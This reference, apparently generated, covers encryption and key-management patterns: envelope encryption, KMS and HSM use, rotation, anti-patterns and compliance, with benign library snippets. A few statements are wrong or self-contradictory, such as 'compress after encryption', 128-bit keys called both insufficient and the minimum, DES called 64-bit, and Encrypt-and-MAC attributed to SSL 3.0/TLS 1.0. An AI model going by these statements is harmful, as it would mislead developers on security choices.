Hierarchical key structure where data encrypted with DEK, DEK encrypted with KEK, KEK optionally encrypted with master key. Enables efficient key rotation and delegation without re-encrypting data.

**Structure**:

```
Master Key (HSM/KMS) → KEK → DEK → Plaintext Data
```

**Data Encryption Key (DEK)**: Symmetric key (AES-256) encrypting actual data. Unique per data object, file, or database record. Stored encrypted alongside ciphertext.

**Key Encryption Key (KEK)**: Encrypts DEKs. Rotated independently of data re-encryption. Single KEK may protect thousands of DEKs.

**Master Key**: Root key stored in Hardware Security Module (HSM) or Key Management Service (KMS). Never leaves secure boundary. Encrypts KEKs.

**Rotation Strategy**: Rotate KEK by re-encrypting all associated DEKs without touching data. Rotate DEK by re-encrypting data with new DEK. Master key rotation requires KEK re-encryption cascade.

**Performance Optimization**: Cache decrypted DEKs in memory for duration of operation. Avoid repeated KMS calls per record. Balance security (shorter cache TTL) against performance (longer cache TTL).

### Field-Level Encryption Pattern

Encrypts individual fields within data structures, enabling fine-grained access control and minimizing decryption scope.

**Deterministic Encryption**: Produces identical ciphertext for identical plaintext. Enables equality queries (`WHERE encrypted_ssn = ?`) and joins on encrypted columns. Vulnerable to frequency analysis; known plaintext reveals patterns.

**Randomized Encryption**: Introduces IV (Initialization Vector) for identical plaintexts producing different ciphertexts. Maximum security but prevents equality queries. Requires full table scans or separate plaintext index.

**Searchable Encryption**: [Inference] Specialized encryption schemes enable searching encrypted data without full decryption. Implementations include order-preserving encryption (OPE) and property-preserving encryption, though these introduce security tradeoffs compared to standard encryption.

**Format-Preserving Encryption (FPE)**: Ciphertext matches plaintext format (e.g., 16-digit credit card encrypted to 16 digits). Enables legacy system integration without schema changes. Uses FF1/FF3-1 algorithms (NIST SP 800-38G). Smaller keyspace than block ciphers; avoid for high-security requirements.

**Tokenization Hybrid**: Combine encryption with tokenization for payment data. Encrypt actual card number, store token in application database. Token mapped to encrypted value in secure vault. PCI DSS compliance without encrypting application database.

### Key Management Patterns

**Centralized KMS**: Cloud provider KMS (AWS KMS, Azure Key Vault, GCP Cloud KMS) manages master keys. Applications request data key generation, encryption, and decryption via API. Keys never leave HSM boundary.

**Distributed Key Management**: Each service manages own keys locally. Increases availability but complicates rotation and auditing. Appropriate for edge computing or air-gapped environments.

**Key Derivation**: Generate child keys from master key using KDF (Key Derivation Function). HKDF (HMAC-based KDF) or PBKDF2 derive deterministic keys from password/passphrase. Enables hierarchical key trees without storing all keys.

**Key Splitting (Shamir's Secret Sharing)**: Split master key into N shares requiring M shares for reconstruction (M-of-N threshold). Distributes trust; no single party holds complete key. Increases operational complexity for key access.

**Hardware Security Modules (HSM)**: Tamper-resistant devices performing cryptographic operations without exposing keys. FIPS 140-2 Level 3 certified minimum for production. On-premise HSMs vs. cloud HSM services trade control for operational overhead.

### Homomorphic Encryption Pattern

[Inference] Enables computation on encrypted data without decryption. Results remain encrypted; only authorized parties decrypt final output.

**Partially Homomorphic Encryption (PHE)**: Supports single operation type (addition or multiplication). Example: Paillier cryptosystem allows addition on ciphertexts. Use case: encrypted voting tallies.

**Fully Homomorphic Encryption (FHE)**: Supports arbitrary computations on encrypted data. Significant performance overhead (10,000x-1,000,000x slower than plaintext). Research-stage for most applications; practical for low-frequency, high-value computations.

**Use Cases**: Privacy-preserving analytics on sensitive datasets, secure multi-party computation, encrypted machine learning inference. [Unverified] Performance limitations currently restrict production adoption to specialized scenarios.

### Zero-Knowledge Encryption Pattern

Service provider cannot access user data plaintext. User-controlled keys never transmitted to server. Also termed client-side encryption or end-to-end encryption in storage context.

**Architecture**: Client encrypts data locally before upload. Server stores ciphertext only. Decryption occurs client-side after download. Examples: Tresorit, SpiderOak, Proton Drive.

**Key Derivation from Password**: User password derives encryption key via PBKDF2, Argon2, or scrypt. Password never transmitted to server. Forgotten password equals data loss unless recovery mechanism exists.

**Recovery Mechanisms**:

- **Recovery Key**: Generate separate key stored offline by user. Complexity trades security for usability.
- **Escrow**: Encrypt user key with organization master key. Enables admin recovery but violates zero-knowledge property.
- **Social Recovery**: Split recovery key using Shamir's Secret Sharing across trusted contacts.

**Trade-offs**: Maximum privacy but eliminates server-side features requiring plaintext access (search, deduplication, content analysis, sharing without re-encryption).

### Authenticated Encryption Pattern

Combines confidentiality (encryption) and authenticity (MAC) in single operation. Prevents tampering and chosen-ciphertext attacks.

**AEAD Modes**: Authenticated Encryption with Associated Data. AES-GCM (Galois/Counter Mode) and ChaCha20-Poly1305 provide both encryption and authentication. **Critical**: Never reuse IV with same key in GCM mode; causes catastrophic security failure.

**Encrypt-then-MAC**: Encrypt plaintext, compute MAC over ciphertext. Most secure construction when implemented correctly. Decryption fails immediately on MAC validation failure.

**MAC-then-Encrypt**: Compute MAC over plaintext, encrypt both. Vulnerable to padding oracle attacks in CBC mode. Avoid this construction.

**Encrypt-and-MAC**: Separate encryption and MAC operations over plaintext. SSL 3.0/TLS 1.0 approach. Vulnerable to timing attacks. Deprecated.

**Associated Data**: Authenticate plaintext metadata alongside encrypted payload. Example: encrypt message body, authenticate headers (sender, timestamp). Prevents header manipulation attacks.

### Database Encryption Patterns

**Always Encrypted (SQL Server)**: Client-side encryption with deterministic and randomized modes. Encryption transparent to application with driver support. Queries on deterministic columns only; randomized columns retrieve for client-side filtering.

**Client-Side Field-Level Encryption (MongoDB)**: Application-level encryption with automatic key rotation. Driver handles encryption/decryption. Supports equality queries on deterministically encrypted fields.

**Transparent Data Encryption Limitations**: Protects physical media theft but not SQL injection or compromised application credentials. Keys accessible to DBMS means privileged users access plaintext.

**CryptDB Pattern**: [Inference] Layered encryption enabling SQL queries on encrypted data. Onion encryption with multiple layers, each supporting different query types. Theoretical approach with limited production adoption.

### Encryption Key Hierarchies

**Four-Tier Hierarchy**:

1. **Root Key**: HSM-stored, rarely accessed
2. **Domain Key**: Encrypts category of keys (per-service, per-region)
3. **Data Encryption Key**: Encrypts actual data
4. **Session Key**: Ephemeral keys for single session/connection

**Key Wrapping**: Encrypt keys with other keys rather than storing plaintext. AES Key Wrap (RFC 3394) or RSA-OAEP for asymmetric wrapping.

**Key Versioning**: Maintain multiple key versions simultaneously. Encrypt new data with current version; decrypt old data with historical versions. Enables gradual migration during rotation.

### Performance Considerations

**Hardware Acceleration**: AES-NI instruction set accelerates AES operations 4-10x. Verify CPU support and enable in encryption libraries. ChaCha20 performs better on CPUs without AES-NI.

**Encryption Overhead Benchmarks**: [Unverified - varies by implementation and hardware]

- AES-GCM with AES-NI: ~0.5-1 CPU cycles per byte
- AES-GCM without AES-NI: ~10-20 cycles per byte
- RSA 2048-bit encrypt: ~0.1-0.5ms per operation
- RSA 2048-bit decrypt: ~5-15ms per operation

**Batching**: Amortize KMS API latency by generating data keys in batches. Single KMS call generates multiple DEKs. Cache decrypted DEKs for bulk processing.

**Streaming Encryption**: Encrypt data incrementally for large files. Avoid loading entire file into memory. Use cipher streaming modes (CTR, GCM) processing fixed-size chunks.

### Anti-Patterns and Vulnerabilities

**ECB Mode**: Electronic Codebook mode encrypts identical plaintext blocks to identical ciphertext blocks. Reveals patterns in data. Penguin image example demonstrates information leakage. Never use ECB for data encryption.

**Weak Key Derivation**: Using MD5 or SHA-1 for key derivation. These hash functions vulnerable to collision attacks. Use HKDF with SHA-256 or stronger.

**Hardcoded Keys**: Encryption keys embedded in source code or configuration files. Discovered through reverse engineering or repository scanning. Always use external key management systems.

**Insufficient Key Length**: DES (56-bit), 3DES (112-bit), RSA 1024-bit insufficient against modern attacks. Minimum: AES-128 (equivalent to RSA-3072), recommended: AES-256 (equivalent to RSA-15360).

**IV/Nonce Reuse**: Reusing initialization vectors with same key in stream ciphers or GCM mode completely breaks encryption. Generate cryptographically random IV for each encryption operation.

**Unauthenticated Encryption**: Encryption without MAC enables bit-flipping attacks and padding oracle attacks. Always use authenticated encryption (AES-GCM, ChaCha20-Poly1305).

**Key Derivation from Timestamps**: Using predictable values (timestamps, sequential counters) as encryption keys. Attacker enumerates keyspace. Always use cryptographically secure random number generators.

**Compression Before Encryption**: Compressing data before encryption enables CRIME/BREACH attacks if attacker controls part of plaintext. Compress after encryption or avoid compression for mixed attacker-controlled data.

**Encrypt-then-Compress**: Ciphertext has high entropy; compression ineffective. Compress plaintext first, but evaluate CRIME/BREACH attack surface.

### Compliance Patterns

**FIPS 140-2 Compliance**: Use FIPS-validated cryptographic modules for government systems. Validated algorithms: AES, SHA-2/SHA-3, RSA, ECDSA. Avoid non-validated implementations even if algorithmically identical.

**PCI DSS Encryption**: Cardholder data encrypted with strong cryptography (AES-256, RSA-2048 minimum). Keys stored separately from encrypted data. Key custodian separation enforced.

**GDPR Data Protection**: Encryption as pseudonymization technique reducing breach impact. Not anonymization; encrypted data remains personal data. Breach notification requirements lessened for encrypted data if keys secured.

**HIPAA Security Rule**: ePHI encryption required for transmission; addressable for storage. Risk analysis determines necessity. Encryption safe harbor protects from breach notification if keys not compromised.

### Quantum-Resistant Encryption

**Post-Quantum Cryptography (PQC)**: NIST-standardized algorithms resistant to quantum computing attacks. CRYSTALS-Kyber (key encapsulation), CRYSTALS-Dilithium (digital signatures), SPHINCS+ (hash-based signatures).

**Hybrid Approach**: Combine classical (RSA, ECDH) and post-quantum algorithms. Secure if either algorithm remains unbroken. Transitional strategy during PQC adoption.

**Timeline Considerations**: [Inference] Large-scale quantum computers capable of breaking RSA/ECC may emerge within 10-30 years. "Harvest now, decrypt later" attacks motivate encrypting long-lived sensitive data with quantum-resistant algorithms today.

### Monitoring and Auditing

**Metrics**:

- Encryption operation latency (p50, p95, p99)
- KMS API call volume and error rates
- Key rotation completion rates
- Failed decryption attempts (potential attack indicator)
- Plaintext data access patterns

**Audit Logging**: Record key access events (generation, usage, rotation, deletion). Log data encryption/decryption with key version identifiers. Immutable audit trail for compliance and forensics.

**Key Usage Anomalies**: Detect unusual patterns (off-hours access, geographic anomalies, volume spikes). Indicates compromised credentials or insider threats.

**Encryption Coverage**: Monitor percentage of sensitive data encrypted. Identify unencrypted sensitive fields through data classification scans. Track encryption adoption across services.

### Related Topics

Key management service architecture, certificate authority design, secrets rotation automation, cryptographic protocol selection, side-channel attack mitigation, secure key storage, data classification strategies, tokenization patterns, crypto-shredding techniques, perfect forward secrecy

---

## Key Management Patterns

Key management encompasses generation, distribution, storage, rotation, and revocation of cryptographic keys throughout their lifecycle. Inadequate key management undermines cryptographic strength regardless of algorithm security.

### Key Hierarchy and Derivation

**Hierarchical Key Structure** Multi-tier architecture limits blast radius of key compromise:

```
Master Key (HSM/KMS)
    ├── Key Encryption Keys (KEK)
    │   ├── Data Encryption Key 1 (DEK)
    │   ├── Data Encryption Key 2 (DEK)
    │   └── Data Encryption Key N (DEK)
    └── Key Encryption Keys (KEK)
        └── Data Encryption Keys (DEK)
```

**Master Key**: Long-lived, rarely accessed, stored in HSM. Encrypts KEKs. **Key Encryption Key**: Encrypts DEKs. Rotated annually. **Data Encryption Key**: Encrypts actual data. Rotated per encryption operation or time period.

Compromise of DEK exposes only data encrypted by that specific key. KEK compromise requires master key to decrypt.

**Key Derivation Functions (KDF)** Generate multiple keys from single master key using one-way functions:

```python
# HKDF (HMAC-based KDF) - RFC 5869
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

derived_key = HKDF(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    info=b'application-specific-context',
).derive(master_key)
```

Context-specific derivation prevents key reuse across domains. `info` parameter binds derived key to specific purpose (encryption, authentication, specific tenant).

**Deterministic vs Random Key Generation**

- **Deterministic**: Derive keys from master + context. Enables key recovery without storage. Requires secure master key retention.
- **Random**: Generate cryptographically random keys per operation. Requires persistent storage and backup strategy.

### Key Rotation Strategies

**Scheduled Rotation** Time-based key replacement reduces exposure window:

```
T0: Key V1 active (encrypt + decrypt)
T1: Generate Key V2, transition period begins
    - V2 active for new encryption
    - V1 retained for decryption only
T2: Re-encrypt all V1 data with V2
T3: Retire V1, V2 fully active
```

Rotation frequency depends on key usage volume and compliance requirements (PCI DSS: annual for KEKs).

**Event-Driven Rotation** Immediate rotation triggered by:

- Suspected compromise
- Personnel changes (employee departure with key access)
- Cryptographic algorithm deprecation (SHA-1 sunset)
- Compliance violation detection

**Online vs Offline Rotation**

**Online Rotation**: Background process re-encrypts data without service interruption. Requires dual-key support during transition. High I/O load during re-encryption phase.

**Offline Rotation**: Service downtime for complete key replacement. Acceptable for low-frequency operations or maintenance windows.

**Versioned Encryption** Embed key version in ciphertext metadata:

```
ciphertext_structure = {
    'version': 2,
    'algorithm': 'AES-256-GCM',
    'ciphertext': encrypted_data,
    'iv': initialization_vector,
    'tag': authentication_tag
}
```

Decryption logic selects appropriate key based on version. Enables gradual migration without flag day.

### Key Distribution Mechanisms

**Asymmetric Key Exchange** Public key cryptography eliminates pre-shared secret requirement:

```
1. Server generates RSA/ECC key pair
2. Server publishes public key
3. Client encrypts symmetric session key with server public key
4. Server decrypts with private key
5. Both parties use symmetric key for bulk encryption
```

Diffie-Hellman variants (ECDHE) provide forward secrecy—session keys not derivable from long-term keys.

**Key Agreement Protocols** Participants jointly compute shared secret without transmission:

```python
# ECDH example
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

# Party A
private_key_a = ec.generate_private_key(ec.SECP384R1())
public_key_a = private_key_a.public_key()

# Party B
private_key_b = ec.generate_private_key(ec.SECP384R1())
public_key_b = private_key_b.public_key()

# Both compute same shared secret
shared_secret_a = private_key_a.exchange(ec.ECDH(), public_key_b)
shared_secret_b = private_key_b.exchange(ec.ECDH(), public_key_a)
# shared_secret_a == shared_secret_b

# Derive key from shared secret
session_key = HKDF(...).derive(shared_secret_a)
```

**Key Wrapping (RFC 3394)** AES Key Wrap encrypts keys for secure transmission/storage:

```python
from cryptography.hazmat.primitives.keywrap import aes_key_wrap

wrapped_key = aes_key_wrap(
    wrapping_key=kek,
    key_to_wrap=dek,
    backend=default_backend()
)
```

Includes integrity check—tampered wrapped keys fail unwrapping. Used in PKCS#11, JWE, envelope encryption.

### Envelope Encryption Pattern

Cloud provider pattern combining local and remote key management:

```
1. Generate local DEK (plaintext)
2. Encrypt data with DEK locally
3. Send DEK to KMS for encryption (creates wrapped DEK)
4. Store encrypted data + wrapped DEK
5. Discard plaintext DEK from memory

Decryption:
1. Retrieve wrapped DEK
2. Send to KMS for unwrapping (returns plaintext DEK)
3. Decrypt data with plaintext DEK locally
4. Discard plaintext DEK from memory
```

Data never transmitted to KMS. KMS operations audit logged. Supports per-object encryption keys.

### Key Storage Security

**Hardware Security Modules (HSM)** FIPS 140-2 Level 3+ tamper-resistant devices:

- **Physical Security**: Epoxy encapsulation, tamper sensors trigger zeroization
- **Logical Security**: Authenticated access, role-based permissions
- **Key Non-Exportability**: Private operations occur within HSM boundary

**PKCS#11 Interface** Standard API for HSM operations:

```c
CK_SESSION_HANDLE session;
CK_MECHANISM mechanism = {CKM_RSA_PKCS, NULL_PTR, 0};

// Key operations without extracting private key
C_SignInit(session, &mechanism, private_key_handle);
C_Sign(session, data, data_len, signature, &sig_len);
```

**Cloud KMS Architecture** AWS KMS, Google Cloud KMS, Azure Key Vault:

- **Customer Master Keys (CMK)**: Stored in FIPS 140-2 Level 3 HSMs
- **Automatic Rotation**: Optional annual rotation with key version management
- **Envelope Encryption**: Generate data keys encrypted under CMK
- **Access Control**: IAM policies govern cryptographic operations

```python
# AWS KMS example
import boto3

kms = boto3.client('kms')

# Generate data key
response = kms.generate_data_key(
    KeyId='arn:aws:kms:region:account:key/id',
    KeySpec='AES_256'
)

plaintext_key = response['Plaintext']  # Use immediately
encrypted_key = response['CiphertextBlob']  # Store with data

# Decrypt data key when needed
response = kms.decrypt(CiphertextBlob=encrypted_key)
plaintext_key = response['Plaintext']
```

**Shamir's Secret Sharing** Split master key into N shares, require K shares for reconstruction (K-of-N threshold):

```
Master Key → Split into 5 shares
Reconstruction requires any 3 shares
Individual shares reveal no information
```

Used for HSM unsealing (HashiCorp Vault), distributed key management, disaster recovery.

### Key Backup and Recovery

**Escrow Systems** Third-party key storage for recovery scenarios:

- **Legal Compliance**: Law enforcement access requirements (CALEA)
- **Business Continuity**: Recovery after key loss incident
- **Employee Departure**: Access to encrypted data after personnel changes

**[Inference]** Escrow introduces additional attack surface and trusted party risk.

**M-of-N Recovery** Combine threshold cryptography with organizational roles:

```
Backup requires: 2 of 3 executives
Recovery requires: 3 of 5 designated personnel
```

Prevents single-point compromise or coercion.

**Encrypted Backup Strategy**

```
Backup Key Hierarchy:
Root Backup Key (split via Shamir, offline cold storage)
    ├── Backup Encryption Key (encrypts key backups)
    └── Recovery keys stored in geographically distributed secure facilities
```

**Anti-Pattern: Plaintext Key Backups** Defeats encryption security model. Backup compromise exposes all protected data. Always encrypt key backups under separate key hierarchy.

### Key Deletion and Zeroization

**Cryptographic Erasure** Destroy encryption key rather than data itself:

```
1. Identify all key copies (active, backup, cached, logged)
2. Overwrite key material (multiple passes for magnetic media)
3. Trigger dependent key cascade deletion
4. Verify deletion through audit
```

Data becomes cryptographically irrecoverable without key. Efficient for large datasets—destroying key renders data unreadable.

**Secure Deletion Challenges**

- **SSD TRIM**: Wear leveling may retain deleted data in unmapped blocks
- **Database Soft Deletes**: Logical deletion leaves physical data intact
- **Backup Retention**: Key exists in historical backups beyond operational deletion
- **Log Files**: Keys accidentally logged persist in log aggregation systems
- **Memory Dumps**: Process crash dumps may contain key material

**Key Revocation** Immediate operational removal without physical deletion:

```
Key Status Transitions:
Active → Revoked (timestamp, reason)
Revoked keys fail all cryptographic operations
Maintain revocation list for audit
```

Certificate Revocation Lists (CRL) or Online Certificate Status Protocol (OCSP) for PKI revocation checking.

### Multi-Tenant Key Isolation

**Per-Tenant Key Derivation**

```python
tenant_key = HKDF(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    info=f'tenant-{tenant_id}'.encode(),
).derive(master_tenant_key)
```

Cryptographically separates tenant data. Tenant compromise doesn't affect other tenants.

**Key Namespace Isolation**

```
/keys/tenant-{uuid}/
    ├── encryption-key
    ├── signing-key
    └── hmac-key
```

Access control policies enforce tenant boundary. Prevents cross-tenant key access via API.

**Bring Your Own Key (BYOK)** Enterprise customers provide encryption keys:

- **Customer Control**: Key lifecycle managed externally
- **Regulatory Compliance**: Keys never leave customer infrastructure
- **Implementation**: Hybrid approach—customer HSM wraps service DEKs

**[Inference]** BYOK complicates operational procedures and may reduce service availability if customer key infrastructure fails.

### Key Lifecycle State Machine

```
Generated → Active → Deactivated → Compromised/Expired → Destroyed
              ↓
           Rotated (new key generated)
```

**State Definitions**:

- **Pre-Active**: Key generated but not yet in operational use
- **Active**: Key performs cryptographic operations
- **Suspended**: Temporarily disabled, reversible
- **Deactivated**: Decryption only, no new encryption
- **Compromised**: Immediate revocation, forensic investigation
- **Destroyed**: Cryptographic material permanently erased

State transitions logged for compliance audit trails.

### Key Usage Policies

**Cryptoperiod Limits** Maximum key usage duration before mandatory rotation:

|Key Type|Recommended Cryptoperiod|
|---|---|
|Session Keys|Single session|
|Data Encryption Keys|1-12 months|
|Key Encryption Keys|1-2 years|
|Master Keys|3-5 years|
|Certificate Private Keys|Certificate validity period|

**Usage Count Limits** AES-GCM nonce collision risk after 2^32 encryptions with same key. Enforce rotation before limit:

```python
if encryption_counter >= 2**32 - safety_margin:
    rotate_key()
```

**Algorithm Agility** Support multiple algorithms simultaneously:

```json
{
  "key_id": "key-123",
  "algorithm": "AES-256-GCM",
  "fallback_algorithms": ["AES-256-CBC", "ChaCha20-Poly1305"]
}
```

Enables migration from deprecated algorithms (3DES, RC4) without flag day.

### Key Compromise Detection

**Indicators of Compromise**:

- Unauthorized API calls to key management system
- Unusual geographic access patterns
- Bulk key export operations
- Elevated privilege escalation attempts
- Anomalous decryption request volumes

**Honey Encryption** Generate plausible-looking plaintext from wrong key:

```
Correct Key: "account:12345, balance:$50000"
Wrong Key:   "account:94821, balance:$23000" (fake but realistic)
```

Attackers cannot distinguish correct decryption from incorrect without external validation. Limits automated key testing.

**Key Attribution Watermarking** Embed unique identifier in derived keys:

```
derived_key = KDF(master_key, context + user_id + timestamp)
```

Compromised key traces back to specific user/system. Requires logging key derivation parameters.

### Multi-Region Key Replication

**Synchronous Replication** Write to multiple regions before acknowledging operation:

```
1. Client requests key generation
2. KMS writes to primary region
3. KMS synchronously replicates to secondary regions
4. Acknowledge success after quorum (2 of 3 regions)
```

Strong consistency but higher latency. Failure in one region blocks operations.

**Asynchronous Replication** Primary region acknowledges immediately, background replication:

```
1. Write to primary region → immediate success
2. Async replication to secondary regions
3. Eventual consistency across regions (seconds to minutes)
```

Lower latency but temporary inconsistency. Failover may expose older key versions.

**Regional Key Isolation** Independent key sets per region:

```
us-east-1: keys/encryption-key-v1
eu-west-1: keys/encryption-key-v1 (different key material)
```

Regulatory compliance (GDPR data residency). Regional breach contained. Complicates disaster recovery and cross-region data access.

### Anti-Patterns

**Hardcoded Keys in Source Code** Version control history retains keys indefinitely. Public repositories expose secrets. Rotation requires code deployment.

**Key Reuse Across Purposes** Same key for encryption + authentication enables cryptographic attacks. Use purpose-specific derived keys.

**Insufficient Key Length** 64-bit DES, 128-bit symmetric keys insufficient against modern compute (cloud GPU clusters). Minimum: 128-bit symmetric, 2048-bit RSA, 256-bit ECC.

**Unauthenticated Encryption** Encryption without authentication (AES-CBC without HMAC) vulnerable to padding oracle, bit flipping attacks. Use authenticated encryption (AES-GCM, ChaCha20-Poly1305).

**Key Material in Logs** Accidental logging of keys, initialization vectors, or encrypted keys enables offline attacks. Sanitize logs, use structured logging with redaction.

**Predictable Key Generation** Weak random number generators (Mersenne Twister, `rand()`) produce guessable keys. Use cryptographically secure RNG (`/dev/urandom`, `secrets` module, platform crypto APIs).

### Quantum-Resistant Key Management

**Post-Quantum Cryptography (PQC)** Prepare for quantum computer threats to current asymmetric algorithms:

- **NIST PQC Standards**: CRYSTALS-Kyber (key encapsulation), CRYSTALS-Dilithium (signatures)
- **Hybrid Schemes**: Combine classical + PQC algorithms during transition
- **Crypto Agility**: Design systems for algorithm swapping

**[Speculation]** Large-scale quantum computers capable of breaking RSA-2048/ECC-256 may emerge within 10-30 years, but timeline remains uncertain.

**Quantum Key Distribution (QKD)** Physics-based key exchange using quantum properties:

```
1. Sender transmits photons in quantum states
2. Measurement collapses state—eavesdropping detectable
3. Authenticated classical channel verifies measurement
4. Establish shared symmetric key with information-theoretic security
```

Requires specialized hardware, limited distance (hundreds of kilometers). Primarily research/government deployment currently.

### Compliance and Audit Requirements

**Key Management Policies** Document procedures covering:

- Generation methods and entropy sources
- Storage locations and access controls
- Rotation schedules and triggers
- Backup and recovery procedures
- Incident response for compromise
- Destruction methods and verification

**Audit Logging** Record all key lifecycle events:

```json
{
  "timestamp": "2024-01-15T14:32:01Z",
  "event": "key_rotation",
  "key_id": "key-789",
  "old_version": 3,
  "new_version": 4,
  "initiated_by": "admin@example.com",
  "reason": "scheduled_rotation"
}
```

Immutable logs prevent tampering. Retention per compliance requirements (PCI DSS: 1 year, SOX: 7 years).

**Separation of Duties** No individual can complete sensitive operations alone:

- Key generation requires two approvals
- Key export requires security officer + department head
- Master key recovery requires M-of-N keyholders

Related topics: Hardware token integration, Key ceremony procedures, Threshold signatures, Distributed key generation protocols, Side-channel attack mitigations, Key attestation mechanisms, Secure multi-party computation for key operations